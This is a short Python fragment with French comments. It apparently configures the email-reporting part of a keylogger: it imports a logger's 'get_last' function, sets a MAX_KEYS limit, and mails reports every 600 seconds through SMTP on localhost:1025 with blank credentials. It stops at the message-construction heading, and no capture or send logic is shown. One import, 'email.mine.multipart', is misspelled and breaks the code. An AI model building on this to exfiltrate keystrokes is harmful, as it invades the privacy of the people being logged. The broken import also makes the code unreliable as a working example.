import smtplib
import time
import threading
from email.mine.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import os
from datetime import datetime
from logger import get_last

# ── CONFIGURATION ────────────────────────────────────────────
SMTP_SERVER = "localhost"
SMTP_PORT = 1025

EMAIL_FROM = ""

EMAIL_TO = ""
EMAIL_PASSWORD = ""

SEND_INTERVAL = 600
MAX_KEYS = 100

# ── CONSTRUCTION DU MESSAGE ──────────────────────────────────
